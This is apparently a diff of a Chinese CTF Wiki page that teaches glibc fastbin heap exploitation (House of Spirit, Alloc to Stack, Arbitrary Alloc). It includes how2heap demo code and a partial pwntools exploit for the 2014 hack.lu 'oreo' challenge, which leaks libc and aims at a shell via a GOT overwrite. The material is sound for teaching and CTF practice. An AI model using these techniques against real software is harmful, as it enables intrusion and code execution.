@@ -77,8 +77,10 @@
 <ul class="simple">
 <li>Fastbin Double Free</li>
 <li>House of Spirit</li>
+<li>Alloc to Stack</li>
 <li>Arbitrary Alloc</li>
 </ul>
+<p>其中，前两种主要漏洞侧重于利用 <code class="docutils literal"><span class="pre">free</span></code> 函数释放<strong>真的 chunk 或伪造的 chunk</strong>，然后再次申请 chunk 进行攻击，后两种侧重于故意修改 <code class="docutils literal"><span class="pre">fd</span></code> 指针，直接利用 <code class="docutils literal"><span class="pre">malloc</span></code> 申请指定位置 chunk 进行攻击。</p>
 </div>
 <div class="section" id="id2">
 <h2>原理<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h2>
@@ -148,7 +150,7 @@
 <p>Fastbin Double Free 能够成功利用主要有两部分的原因</p>
 <ol class="arabic simple">
 <li>fastbin 的堆块被释放后 next_chunk 的 pre_inuse 位不会被清空</li>
-<li>fastbin 在执行 free 的时候仅验证了 main_arena 直接指向的块，对于链表后面的块，并没有进行验证。</li>
+<li>fastbin 在执行 free 的时候仅验证了 main_arena 直接指向的块，即链表指针头部的块。对于链表后面的块，并没有进行验证。</li>
 </ol>
 <div class="highlight-default"><div class="highlight"><pre><span></span><span class="o">/*</span> <span class="n">Another</span> <span class="n">simple</span> <span class="n">check</span><span class="p">:</span> <span class="n">make</span> <span class="n">sure</span> <span class="n">the</span> <span class="n">top</span> <span class="n">of</span> <span class="n">the</span> <span class="nb">bin</span> <span class="ow">is</span> <span class="ow">not</span> <span class="n">the</span>
        <span class="n">record</span> <span class="n">we</span> <span class="n">are</span> <span class="n">going</span> <span class="n">to</span> <span class="n">add</span> <span class="p">(</span><span class="n">i</span><span class="o">.</span><span class="n">e</span><span class="o">.</span><span class="p">,</span> <span class="n">double</span> <span class="n">free</span><span class="p">)</span><span class="o">.</span>  <span class="o">*/</span>
@@ -227,17 +229,11 @@ ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsysca
 </pre></div>
 </div>
 <p>第一次释放<code class="docutils literal"><span class="pre">free(chunk1)</span></code></p>
-<div class="figure">
-<img alt="" src="../../_images/fastbin_free_chunk1.png" />
-</div>
+<p><img alt="image1" src="../../_images/fastbin_free_chunk1.png" /></p>
 <p>第二次释放<code class="docutils literal"><span class="pre">free(chunk2)</span></code></p>
-<div class="figure">
-<img alt="" src="../../_images/fastbin_free_chunk2.png" />
-</div>
+<p><img alt="image2" src="../../_images/fastbin_free_chunk2.png" /></p>
 <p>第三次释放<code class="docutils literal"><span class="pre">free(chunk1)</span></code></p>
-<div class="figure">
-<img alt="" src="../../_images/fastbin_free_chunk3.png" />
-</div>
+<p><img alt="image3" src="../../_images/fastbin_free_chunk3.png" /></p>
 <p>注意因为 chunk1 被再次释放因此其 fd 值不再为 0 而是指向 chunk2，这时如果我们可以控制 chunk1 的内容，便可以写入其 fd 指针从而实现在我们想要的任意地址分配 fastbin 块。
 下面这个示例演示了这一点，首先跟前面一样构造 main_arena=&gt;chunk1=&gt;chun2=&gt;chunk1的链表。之后第一次调用 malloc 返回 chunk1 之后修改 chunk1 的 fd 指针指向 bss 段上的 bss_chunk，之后我们可以看到 fastbin
 会把堆块分配到这里。</p>
@@ -338,22 +334,98 @@ ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsysca
 </div>
 <div class="section" id="id5">
 <h3>小总结<a class="headerlink" href="#id5" title="永久链接至标题">¶</a></h3>
-<p>通过 fastbin double free 我们可以使用多个指针控制同一个堆块，这可以用于篡改一些堆块中的关键数据域或者是实现类似于类型混淆的效果。 如果更进一步修改 fd
-指针，则能够实现任意地址分配堆块的效果(首先要通过验证)，这就相当于任意地址写任意值的效果。</p>
+<p>通过 fastbin double free 我们可以使用多个指针控制同一个堆块，这可以用于篡改一些堆块中的关键数据域或者是实现类似于类型混淆的效果。 如果更进一步修改 fd 指针，则能够实现任意地址分配堆块的效果(
+首先要通过验证 )，这就相当于任意地址写任意值的效果。</p>
 </div>
 </div>
 <div class="section" id="house-of-spirit">
 <h2>House Of Spirit<a class="headerlink" href="#house-of-spirit" title="永久链接至标题">¶</a></h2>
 <div class="section" id="id6">
 <h3>介绍<a class="headerlink" href="#id6" title="永久链接至标题">¶</a></h3>
-<p>House of Spirit 是 House of XX 的一种，House of XX 是 2004 年左右的一篇关于 Linux 堆利用的技术文章中提出一系列利用方法。 HOS 可以使得 fastbin
-堆块分配到栈中，从而实现控制栈中的一些关键数据，比如返回地址等。</p>
-<p>如果你已经理解了前文所讲的 Fastbin Double Free，那么理解 HOS 就已经不成问题了，它们的本质都在于 fastbin 链表的构成特性：当前 chunk 的 fd 指针指向下一个 chunk。 HOS 的核心同样在于劫持 fastbin 链表中
-chunk 的 fd 指针，把 fd 指针指向我们想要分配的栈上，实现控制栈中数据。</p>
+<p>House of Spirit 是 <code class="docutils literal"><span class="pre">the</span> <span class="pre">Malloc</span> <span class="pre">Maleficarum</span></code> 中的一种技术。</p>
+<p>该技术的核心在于在目标位置处伪造 fastbin chunk，并将其释放，从而达到分配<strong>指定地址</strong>的 chunk 的目的。</p>
+<p>要想构造 fastbin fake chunk，并且将其释放时，可以将其放入到对应的 fastbin 链表中，需要绕过一些必要的检测，即</p>
+<ul class="simple">
+<li>fake chunk 的 ISMMAP 位不能为1，因为 free 时，如果是 mmap 的 chunk，会单独处理。</li>
+<li>fake chunk 地址需要对齐， MALLOC_ALIGN_MASK</li>
+<li>fake chunk 的 size 大小需要满足对应的 fastbin 的需求，同时也得对齐。</li>
+<li>fake chunk 的 next chunk 的大小不能小于 <code class="docutils literal"><span class="pre">2</span> <span class="pre">*</span> <span class="pre">SIZE_SZ</span></code>，同时也不能大于<code class="docutils literal"><span class="pre">av-&gt;system_mem</span></code> 。</li>
+<li>fake chunk 对应的 fastbin 链表头部不能是该 fake chunk，即不能构成 double free 的情况。</li>
+</ul>
+<p>至于为什么要绕过这些检测，可以参考 free 部分的源码。</p>
 </div>
 <div class="section" id="id7">
 <h3>演示<a class="headerlink" href="#id7" title="永久链接至标题">¶</a></h3>
-<p>这次我们把 fake_chunk 置于栈中称为 stack_chunk，同时劫持了fastbin 链表中 chunk 的 fd 值，通过把这个 fd 值指向 stack_chunk 就可以实现在栈中分配 fastbin chunk。</p>
+<p>这里就直接以 how2heap 上的例子进行说明，如下</p>
+<div class="code c highlight-default"><div class="highlight"><pre><span></span><span class="c1">#include &lt;stdio.h&gt;</span>
+<span class="c1">#include &lt;stdlib.h&gt;</span>
+
+<span class="nb">int</span> <span class="n">main</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s2">&quot;This file demonstrates the house of spirit attack.</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">);</span>
+
+    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s2">&quot;Calling malloc() once so that it sets up its memory.</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">);</span>
+    <span class="n">malloc</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+
+    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s2">&quot;We will now overwrite a pointer to point to a fake &#39;fastbin&#39; region.</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">);</span>
+    <span class="n">unsigned</span> <span class="n">long</span> <span class="n">long</span> <span class="o">*</span><span class="n">a</span><span class="p">;</span>
+    <span class="o">//</span> <span class="n">This</span> <span class="n">has</span> <span class="n">nothing</span> <span class="n">to</span> <span class="n">do</span> <span class="k">with</span> <span class="n">fastbinsY</span> <span class="p">(</span><span class="n">do</span> <span class="ow">not</span> <span class="n">be</span> <span class="n">fooled</span> <span class="n">by</span> <span class="n">the</span> <span class="mi">10</span><span class="p">)</span> <span class="o">-</span> <span class="n">fake_chunks</span> <span class="ow">is</span> <span class="n">just</span> <span class="n">a</span> <span class="n">piece</span> <span class="n">of</span> <span class="n">memory</span> <span class="n">to</span> <span class="n">fulfil</span> <span class="n">allocations</span> <span class="p">(</span><span class="n">pointed</span> <span class="n">to</span> <span class="kn">from</span> <span class="nn">fastbinsY</span><span class="p">)</span>
+    <span class="n">unsigned</span> <span class="n">long</span> <span class="n">long</span> <span class="n">fake_chunks</span><span class="p">[</span><span class="mi">10</span><span class="p">]</span> <span class="n">__attribute__</span> <span class="p">((</span><span class="n">aligned</span> <span class="p">(</span><span class="mi">16</span><span class="p">)));</span>
+
+    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s2">&quot;This region (memory of length: </span><span class="si">%lu</span><span class="s2">) contains two chunks. The first starts at %p and the second at %p.</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span> <span class="n">sizeof</span><span class="p">(</span><span class="n">fake_chunks</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">fake_chunks</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="o">&amp;</span><span class="n">fake_chunks</span><span class="p">[</span><span class="mi">7</span><span class="p">]);</span>
+
+    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s2">&quot;This chunk.size of this region has to be 16 more than the region (to accomodate the chunk data) while still falling into the fastbin category (&lt;= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">);</span>
+    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s2">&quot;... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. </span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">);</span>
+    <span class="n">fake_chunks</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x40</span><span class="p">;</span> <span class="o">//</span> <span class="n">this</span> <span class="ow">is</span> <span class="n">the</span> <span class="n">size</span>
+
+    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s2">&quot;The chunk.size of the *next* fake region has to be sane. That is &gt; 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem (&lt; 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">);</span>
+        <span class="o">//</span> <span class="n">fake_chunks</span><span class="p">[</span><span class="mi">9</span><span class="p">]</span> <span class="n">because</span> <span class="mh">0x40</span> <span class="o">/</span> <span class="n">sizeof</span><span class="p">(</span><span class="n">unsigned</span> <span class="n">long</span> <span class="n">long</span><span class="p">)</span> <span class="o">=</span> <span class="mi">8</span>
+    <span class="n">fake_chunks</span><span class="p">[</span><span class="mi">9</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x1234</span><span class="p">;</span> <span class="o">//</span> <span class="n">nextsize</span>
+
+    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s2">&quot;Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">fake_chunks</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s2">&quot;... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">);</span>
+    <span class="n">a</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">fake_chunks</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
+
+    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s2">&quot;Freeing the overwritten pointer.</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">);</span>
+    <span class="n">free</span><span class="p">(</span><span class="n">a</span><span class="p">);</span>
+
+    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s2">&quot;Now the next malloc will return the region of our fake chunk at %p, which will be %p!</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">fake_chunks</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="o">&amp;</span><span class="n">fake_chunks</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
+    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s2">&quot;malloc(0x30): %p</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x30</span><span class="p">));</span>
+<span class="p">}</span>
+</pre></div>
+</div>
+<p>运行后的效果如下</p>
+<div class="code shell highlight-default"><div class="highlight"><pre><span></span>➜  how2heap git:(master) ./house_of_spirit
+This file demonstrates the house of spirit attack.
+Calling malloc() once so that it sets up its memory.
+We will now overwrite a pointer to point to a fake &#39;fastbin&#39; region.
+This region (memory of length: 80) contains two chunks. The first starts at 0x7ffd9bceaa58 and the second at 0x7ffd9bceaa88.
+This chunk.size of this region has to be 16 more than the region (to accomodate the chunk data) while still falling into the fastbin category (&lt;= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.
+... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end.
+The chunk.size of the *next* fake region has to be sane. That is &gt; 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem (&lt; 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.
+Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, 0x7ffd9bceaa58.
+... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.
+Freeing the overwritten pointer.
+Now the next malloc will return the region of our fake chunk at 0x7ffd9bceaa58, which will be 0x7ffd9bceaa60!
+malloc(0x30): 0x7ffd9bceaa60
+</pre></div>
+</div>
+</div>
+<div class="section" id="id8">
+<h3>小总结<a class="headerlink" href="#id8" title="永久链接至标题">¶</a></h3>
+<p>可以看出，想要使用该技术分配 chunk 到指定地址，其实并不需要修改指定地址的任何内容，<strong>关键是要能够修改指定地址的前后的内容使其可以绕过对应的检测</strong>。</p>
+</div>
+</div>
+<div class="section" id="alloc-to-stack">
+<h2>Alloc to Stack<a class="headerlink" href="#alloc-to-stack" title="永久链接至标题">¶</a></h2>
+<div class="section" id="id9">
+<h3>介绍<a class="headerlink" href="#id9" title="永久链接至标题">¶</a></h3>
+<p>如果你已经理解了前文所讲的 Fastbin Double Free 与 house of spirit 技术，那么理解该技术就已经不成问题了，它们的本质都在于 fastbin 链表的特性：当前 chunk 的 fd 指针指向下一个 chunk。</p>
+<p>该技术的核心点在于劫持 fastbin 链表中 chunk 的 fd 指针，把 fd 指针指向我们想要分配的栈上，从而实现控制栈中的一些关键数据，比如返回地址等。</p>
+</div>
+<div class="section" id="id10">
+<h3>演示<a class="headerlink" href="#id10" title="永久链接至标题">¶</a></h3>
+<p>这次我们把 fake_chunk 置于栈中称为 stack_chunk，同时劫持了 fastbin 链表中 chunk 的 fd 值，通过把这个 fd 值指向 stack_chunk 就可以实现在栈中分配 fastbin chunk。</p>
 <div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">typedef</span> <span class="n">struct</span> <span class="n">_chunk</span>
 <span class="p">{</span>
     <span class="n">long</span> <span class="n">long</span> <span class="n">pre_size</span><span class="p">;</span>
@@ -381,7 +453,7 @@ chunk 的 fd 指针，把 fd 指针指向我们想要分配的栈上，实现控
 <span class="p">}</span>
 </pre></div>
 </div>
-<p>通过gdb调试可以看到我们首先把 chunk1 的 fd 指针指向了 stack_chunk</p>
+<p>通过 gdb 调试可以看到我们首先把 chunk1 的 fd 指针指向了 stack_chunk</p>
 <div class="highlight-default"><div class="highlight"><pre><span></span><span class="mh">0x602000</span><span class="p">:</span>   <span class="mh">0x0000000000000000</span>  <span class="mh">0x0000000000000021</span> <span class="o">&lt;===</span> <span class="n">chunk1</span>
 <span class="mh">0x602010</span><span class="p">:</span>   <span class="mh">0x00007fffffffde60</span>  <span class="mh">0x0000000000000000</span>
 <span class="mh">0x602020</span><span class="p">:</span>   <span class="mh">0x0000000000000000</span>  <span class="mh">0x0000000000020fe1</span> <span class="o">&lt;===</span> <span class="n">top</span> <span class="n">chunk</span>
@@ -420,20 +492,20 @@ chunk 的 fd 指针，把 fd 指针指向我们想要分配的栈上，实现控
 </pre></div>
 </div>
 </div>
-<div class="section" id="id8">
-<h3>小总结<a class="headerlink" href="#id8" title="永久链接至标题">¶</a></h3>
-<p>通过 HOS 我们可以把 fastbin chunk 分配到栈中，从而控制返回地址等关键数据。要实现这一点我们需要劫持fastbin 中 chunk 的 fd 域，把它指到栈上，当然同时需要栈上存在有满足条件的size值。</p>
+<div class="section" id="id11">
+<h3>小总结<a class="headerlink" href="#id11" title="永久链接至标题">¶</a></h3>
+<p>通过该技术我们可以把 fastbin chunk 分配到栈中，从而控制返回地址等关键数据。要实现这一点我们需要劫持fastbin 中 chunk 的 fd 域，把它指到栈上，当然同时需要栈上存在有满足条件的size值。</p>
 </div>
 </div>
 <div class="section" id="arbitrary-alloc">
 <h2>Arbitrary Alloc<a class="headerlink" href="#arbitrary-alloc" title="永久链接至标题">¶</a></h2>
-<div class="section" id="id9">
-<h3>介绍<a class="headerlink" href="#id9" title="永久链接至标题">¶</a></h3>
-<p>Arbitrary Alloc 其实与 House of Spirit 是完全相同的，唯一的区别是分配的目标不再是栈中。 事实上只要满足目标地址存在合法的size域，我们可以把chunk分配到任意的可写内存中，比如bss、heap、data、stack等等。</p>
-<p>大家可能会认为 HOS 与 arbitrary alloc 没有什么区别，因此没有必要分为两类。相信看完下面的一个例子，就会有不一样的想法了。</p>
+<div class="section" id="id12">
+<h3>介绍<a class="headerlink" href="#id12" title="永久链接至标题">¶</a></h3>
+<p>Arbitrary Alloc 其实与 Alloc to stack 是完全相同的，唯一的区别是分配的目标不再是栈中。 事实上只要满足目标地址存在合法的 size 域（这个 size 域是构造的，还是自然存在的都无妨），我们可以把 chunk
+分配到任意的可写内存中，比如bss、heap、data、stack等等。</p>
 </div>
-<div class="section" id="id10">
-<h3>演示<a class="headerlink" href="#id10" title="永久链接至标题">¶</a></h3>
+<div class="section" id="id13">
+<h3>演示<a class="headerlink" href="#id13" title="永久链接至标题">¶</a></h3>
 <p>在这个例子，我们使用字节错位来实现直接分配 fastbin 到<strong>_malloc_hook的位置，相当于覆盖_malloc_hook来控制程序流程。</strong></p>
 <div class="highlight-default"><div class="highlight"><pre><span></span><span class="nb">int</span> <span class="n">main</span><span class="p">(</span><span class="n">void</span><span class="p">)</span>
 <span class="p">{</span>
@@ -510,16 +582,160 @@ Fastbins[idx=6, size=0x70]
 </pre></div>
 </div>
 </div>
-<div class="section" id="id11">
-<h3>小总结<a class="headerlink" href="#id11" title="永久链接至标题">¶</a></h3>
-<p>虽然 Arbitrary Alloc 与 HOS 的原理是相同的，但是 Arbitrary Alloc 在 CTF 中要比 HOS 使用地更加频繁。我们可以利用字节错位等方法来绕过 size 域的检验，实现任意地址分配
-chunk，最后的效果也就相当于任意地址写任意值。</p>
+<div class="section" id="id14">
+<h3>小总结<a class="headerlink" href="#id14" title="永久链接至标题">¶</a></h3>
+<p>Arbitrary Alloc 在 CTF 中用地更加频繁。我们可以利用字节错位等方法来绕过 size 域的检验，实现任意地址分配 chunk，最后的效果也就相当于任意地址写任意值。</p>
+</div>
+</div>
+<div class="section" id="hack-lu-oreo">
+<h2>2014 hack.lu oreo<a class="headerlink" href="#hack-lu-oreo" title="永久链接至标题">¶</a></h2>
+<div class="section" id="id15">
+<h3>基本分析<a class="headerlink" href="#id15" title="永久链接至标题">¶</a></h3>
+<div class="code shell highlight-default"><div class="highlight"><pre><span></span>➜  2014_Hack.lu_oreo git:(master) file oreo
+oreo: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.26, BuildID[sha1]=f591eececd05c63140b9d658578aea6c24450f8b, stripped
+➜  2014_Hack.lu_oreo git:(master) checksec oreo
+[*] &#39;/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/house_of_spirit/2014_Hack.lu_oreo/oreo&#39;
+    Arch:     i386-32-little
+    RELRO:    No RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+</pre></div>
+</div>
+<p>可以看出，程序确实是比较老的，32位程序，动态链接，就连 RELRO 技术也没有上。</p>
+</div>
+<div class="section" id="id16">
+<h3>基本功能<a class="headerlink" href="#id16" title="永久链接至标题">¶</a></h3>
+<p><strong>需要注意的是，该程序并没有进行 setvbuf 操作，因此在初次执行 io 函数时，会在堆上分配空间。</strong></p>
+<p>正如程序中直接输出的信息，程序主要是一个原始的在线枪支系统。其中，根据添加枪支的过程，我们可以得到枪支的基本结构如下</p>
+<div class="code c highlight-default"><div class="highlight"><pre><span></span>00000000 rifle           struc ; (sizeof=0x38, mappedto_5)
+00000000 descript        db 25 dup(?)
+00000019 name            db 27 dup(?)
+00000034 next            dd ?                    ; offset
+00000038 rifle           ends
+</pre></div>
+</div>
+<p>程序的基本功能如下</p>
+<ul class="simple">
+<li>添加枪支，其主要会读取枪支的名字与描述。但问题在于读取的名字的长度过长，可以覆盖 next 指针以及后面堆块的数据。可以覆盖后面堆块的数据大小为 56-(56-27)=27
+大小。需要注意的是，这些枪支的大小都是在fastbin 范围内的。</li>
+<li>展示添加枪支，即从头到尾输出枪支的描述与名字。</li>
+<li>订已经选择的枪支，即将所有已经添加的枪支释放掉，但是并没有置为NULL。</li>
+<li>留下订货消息</li>
+<li>展示目前状态，即添加了多少只枪，订了多少单，留下了什么信息。</li>
+</ul>
+<p>不难分析得到，程序的漏洞主要存在于添加枪支时的堆溢出漏洞。</p>
+</div>
+<div class="section" id="id17">
+<h3>利用<a class="headerlink" href="#id17" title="永久链接至标题">¶</a></h3>
+<p>基本利用思路如下</p>
+<ol class="arabic simple">
+<li>由于程序存在堆溢出漏洞，而且还可以控制 next 指针，我们可以直接控制 next 指针指向程序中 got 表的位置。当进行展示的时候，即可以输出对应的内容，这里同时需要确保假设对应地址为一个枪支结构体时，其 next
+指针为 NULL。这里我采用 <a class="reference external" href="mailto:puts&#37;&#52;&#48;got">puts<span>&#64;</span>got</a>。通过这样的操作，我们就可以获得出 libc 基地址，以及 system 函数地址。</li>
+<li>由于枪支结构体大小是 0x38 大小，所以其对应的 chunk 为 0x40。这里采用 <code class="docutils literal"><span class="pre">house</span> <span class="pre">of</span> <span class="pre">sprit</span></code> 的技术来返回 0x0804A2A8 处的chunk，即留下的消息的指针。因此，我们需要设置 0x0804A2A4 处的内容为
+0x40，即需要添加 0x40 支枪支，从而绕过大小检测。同时为了确保可以绕过 next chunk 的检测，这里我们编辑留下的消息。</li>
+<li>在成功分配这样的 chunk 后，我们其实就有了一个任意地址修改的漏洞，这里我们可以选择修改一个合适的 got 项为 system 地址，从而获得 shell。</li>
+</ol>
+<p>具体代码如下</p>
+<div class="code python highlight-default"><div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="k">import</span> <span class="o">*</span>
+<span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;gnome-terminal&#39;</span><span class="p">,</span> <span class="s1">&#39;-x&#39;</span><span class="p">,</span> <span class="s1">&#39;sh&#39;</span><span class="p">,</span> <span class="s1">&#39;-c&#39;</span><span class="p">]</span>
+<span class="k">if</span> <span class="n">args</span><span class="p">[</span><span class="s1">&#39;DEBUG&#39;</span><span class="p">]:</span>
+    <span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
+<span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="s2">&quot;./oreo&quot;</span>
+<span class="n">oreo</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;./oreo&quot;</span><span class="p">)</span>
+<span class="k">if</span> <span class="n">args</span><span class="p">[</span><span class="s1">&#39;REMOTE&#39;</span><span class="p">]:</span>
+    <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&quot;./oreo&quot;</span><span class="p">)</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;PID: &#39;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">proc</span><span class="o">.</span><span class="n">pidof</span><span class="p">(</span><span class="n">p</span><span class="p">)[</span><span class="mi">0</span><span class="p">]))</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./libc.so.6&#39;</span><span class="p">)</span>
+
+
+<span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">descrip</span><span class="p">,</span> <span class="n">name</span><span class="p">):</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
+    <span class="c1">#p.recvuntil(&#39;Rifle name: &#39;)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">name</span><span class="p">)</span>
+    <span class="c1">#p.recvuntil(&#39;Rifle description: &#39;)</span>
+    <span class="c1">#sleep(0.5)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">descrip</span><span class="p">)</span>
+
+
+<span class="k">def</span> <span class="nf">show_rifle</span><span class="p">():</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;2&#39;</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;===================================</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+
+
+<span class="k">def</span> <span class="nf">order</span><span class="p">():</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;3&#39;</span><span class="p">)</span>
+
+
+<span class="k">def</span> <span class="nf">message</span><span class="p">(</span><span class="n">notice</span><span class="p">):</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;4&#39;</span><span class="p">)</span>
+    <span class="c1">#p.recvuntil(&quot;Enter any notice you&#39;d like to submit with your order: &quot;)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">notice</span><span class="p">)</span>
+
+
+<span class="k">def</span> <span class="nf">exp</span><span class="p">():</span>
+    <span class="nb">print</span> <span class="s1">&#39;step 1. leak libc base&#39;</span>
+    <span class="n">name</span> <span class="o">=</span> <span class="mi">27</span> <span class="o">*</span> <span class="s1">&#39;a&#39;</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">oreo</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">])</span>
+    <span class="n">add</span><span class="p">(</span><span class="mi">25</span> <span class="o">*</span> <span class="s1">&#39;a&#39;</span><span class="p">,</span> <span class="n">name</span><span class="p">)</span>
+    <span class="n">show_rifle</span><span class="p">()</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;===================================</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Description: &#39;</span><span class="p">)</span>
+    <span class="n">puts_addr</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="kc">True</span><span class="p">)[:</span><span class="mi">4</span><span class="p">])</span>
+    <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s1">&#39;puts addr: &#39;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">puts_addr</span><span class="p">))</span>
+    <span class="n">libc_base</span> <span class="o">=</span> <span class="n">puts_addr</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span>
+    <span class="n">system_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span>
+    <span class="n">binsh_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s1">&#39;/bin/sh&#39;</span><span class="p">))</span>
+
+    <span class="nb">print</span> <span class="s1">&#39;step 2. free fake chunk at 0x0804A2A8&#39;</span>
+
